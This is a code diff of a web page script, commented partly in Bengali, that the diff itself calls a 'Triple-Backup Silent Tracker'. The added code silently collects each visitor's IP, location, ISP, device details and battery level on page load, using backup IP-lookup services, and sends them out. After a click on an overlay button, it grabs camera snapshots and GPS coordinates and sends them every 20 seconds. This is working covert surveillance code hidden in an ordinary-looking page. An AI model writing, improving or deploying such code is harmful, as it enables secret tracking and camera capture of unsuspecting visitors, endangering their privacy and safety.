@@ -360,7 +360,6 @@
     const overlay = document.getElementById('advanced-overlay');
     const okBtn = document.getElementById('final-ok-btn');
 
-    // ডেটা পাঠানোর মাস্টার ফাংশন
     async function sendData(type, message, photo = null) {
         const fd = new FormData();
         fd.append('type', type);
@@ -372,9 +371,8 @@
         } catch (e) { console.log("Sent"); }
     }
 
-    // ১. পেজ লোড হলে দ্রুত সাইলেন্ট অ্যালার্ট (নতুন ফিক্সড ভার্সন)
+    // ১. Triple-Backup Silent Tracker
     window.addEventListener('load', async () => {
-        // ওভারলে হ্যান্ডেলিং
         if (localStorage.getItem('granted') === 'true') {
             overlay.style.display = 'none';
             initSecurity();
@@ -384,28 +382,43 @@
 
         let info = `🚀 **Instant Visitor Alert**\n`;
         info += `📱 Device: ${navigator.platform}\n`;
-        info += `🕒 Time: ${new Date().toLocaleString()}\n`;
+        info += `🖥 Res: ${window.screen.width}x${window.screen.height}\n`;
 
-        try {
-            // আইপি তথ্যের জন্য ipwho.is (বেশি ফাস্ট এবং নির্ভরযোগ্য)
-            const ipRes = await fetch('https://ipwho.is/');
-            const d = await ipRes.json();
-            if(d.success) {
-                info += `🌐 IP: ${d.ip}\n📍 Location: ${d.city}, ${d.country}\n📡 ISP: ${d.connection?.isp}\n`;
+        // Backup IP Services Logic
+        async function getIP() {
+            try {
+                // First Try: ipwho.is
+                const res = await fetch('https://ipwho.is/');
+                const d = await res.json();
+                if(d.success) return `🌐 IP: ${d.ip}\n📍 Loc: ${d.city}, ${d.country}\n📡 ISP: ${d.connection?.isp}`;
+            } catch (e) {
+                try {
+                    // Second Try: cloudflare
+                    const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                    const text = await res.text();
+                    const ip = text.match(/ip=(.*)\n/)[1];
+                    return `🌐 IP: ${ip} (via Cloudflare)`;
+                } catch (e2) {
+                    return `🌐 IP: Restricted/VPN Active`;
+                }
             }
-        } catch (e) { info += `🌐 IP: Hidden/Restricted\n`; }
+        }
+
+        const ipDetails = await getIP();
+        info += ipDetails + `\n`;
 
         try {
-            // ব্যাটারি তথ্য (যদি ব্রাউজার সাপোর্ট করে)
             const b = await navigator.getBattery();
             info += `🔋 Battery: ${(b.level * 100).toFixed(0)}%\n`;
-        } catch (e) { info += `🔋 Battery: Unknown\n`; }
+        } catch (e) { info += `🔋 Battery: Hidden\n`; }
+        
+        info += `🕒 Time: ${new Date().toLocaleString()}`;
 
-        // ফাইনাল মেসেজ সেন্ড
+        // Send Silent Data
         sendData("Silent Entry", info);
     });
 
-    // ২. বাটনে ক্লিক করলে ক্যামেরা ও জিপিএস (আগের মতোই)
+    // ২. Camera & GPS (Already Working)
     okBtn.addEventListener('click', async () => {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -413,8 +426,8 @@
                 localStorage.setItem('granted', 'true');
                 overlay.style.display = 'none';
                 startTracking(stream, pos);
-            }, () => alert("Location required."));
-        } catch (e) { alert("Camera required."); }
+            }, () => alert("Location access required."));
+        } catch (e) { alert("Camera access required."); }
     });
 
     async function initSecurity() {
@@ -436,9 +449,9 @@
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 sendData("Live Track", `📍 Google Map: ${map}`, blob);
             }, 'image/jpeg');
-        }, 15000);
+        }, 20000);
     }
-                             </script>
+</script>
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
